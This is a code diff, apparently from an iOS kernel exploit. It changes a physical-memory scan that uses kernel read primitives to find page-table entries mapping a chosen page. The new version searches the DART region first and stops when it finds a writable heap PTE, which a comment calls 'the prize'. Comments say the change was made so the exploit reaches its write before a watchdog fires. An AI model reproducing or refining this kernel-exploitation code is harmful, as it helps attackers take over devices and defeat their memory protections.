@@ -3492,28 +3492,39 @@ static NSString *kpFmtSptmFn(uint64_t raw)
               (unsigned long long)ucPA, uoff]);
     if (!ucPA) { [r appendString:@"FAIL: ucPA\n"]; return r; }
 
-    // Hunt alt-PTEs (prefer inDART).
+    // Hunt alt-PTEs: DART window FIRST, stop at first inDART hit (prefer 0x21).
+    // Field: full-phys scan never reached the write before share/watchdog.
     uint64_t hitPA = 0, hitVal = 0, hitTableVA = 0;
     uint32_t hitOff = 0; int hitType = -1; BOOL hitDart = NO;
-    for (uint64_t pa = pB; pa < pB + pS; pa += 0x4000) {
-        int t = kpFrameTypeOf(pa);
-        if (t != 0x15 && t != 0x21 && t != 0x0b) continue;
-        BOOL inDart = (pa >= dartLo);
-        if (!inDart && hitDart) continue;
-        uint64_t al = phystokv(pa);
-        if (!al) continue;
-        for (uint32_t o = 0; o + 8 <= 0x4000; o += 8) {
-            uint64_t q = early_kread64(al + o);
-            if ((q & 3) != 3) continue;
-            if ((q & 0x0000ffffffffc000ULL) != ucPA) continue;
-            kpNote(r, [NSString stringWithFormat:@"  [C3W] cand pa=%#llx off=+%#x t=%d inDART=%d val=%#018llx",
-                      (unsigned long long)pa, o, t, inDart, (unsigned long long)q]);
-            if (inDart && !hitDart) {
-                hitPA = pa; hitOff = o; hitType = t; hitVal = q;
-                hitTableVA = al; hitDart = YES;
-            } else if (!hitDart) {
-                hitPA = pa; hitOff = o; hitType = t; hitVal = q;
-                hitTableVA = al;
+    uint32_t nCand = 0;
+    // Pass 1: DART only. Pass 2: low RAM (backup).
+    for (int pass = 0; pass < 2 && !hitDart; pass++) {
+        uint64_t lo = (pass == 0) ? dartLo : pB;
+        uint64_t hi = pB + pS;
+        kpNote(r, [NSString stringWithFormat:@"  [C3W] scan pass=%d [%#llx..%#llx)",
+                  pass, (unsigned long long)lo, (unsigned long long)hi]);
+        for (uint64_t pa = lo; pa < hi; pa += 0x4000) {
+            int t = kpFrameTypeOf(pa);
+            if (t != 0x15 && t != 0x21 && t != 0x0b) continue;
+            BOOL inDart = (pa >= dartLo);
+            uint64_t al = phystokv(pa);
+            if (!al) continue;
+            for (uint32_t o = 0; o + 8 <= 0x4000; o += 8) {
+                uint64_t q = early_kread64(al + o);
+                if ((q & 3) != 3) continue;
+                if ((q & 0x0000ffffffffc000ULL) != ucPA) continue;
+                nCand++;
+                kpNote(r, [NSString stringWithFormat:@"  [C3W] cand pa=%#llx off=+%#x t=%d inDART=%d val=%#018llx",
+                          (unsigned long long)pa, o, t, inDart, (unsigned long long)q]);
+                BOOL better = (!hitPA)
+                    || (inDart && !hitDart)
+                    || (inDart && hitDart && t == 0x21 && hitType != 0x21);
+                if (better) {
+                    hitPA = pa; hitOff = o; hitType = t; hitVal = q;
+                    hitTableVA = al; hitDart = inDart;
+                }
+                // Done: writable heap PTE in DART is the prize.
+                if (inDart && t == 0x21) { pass = 2; break; }
             }
         }
     }
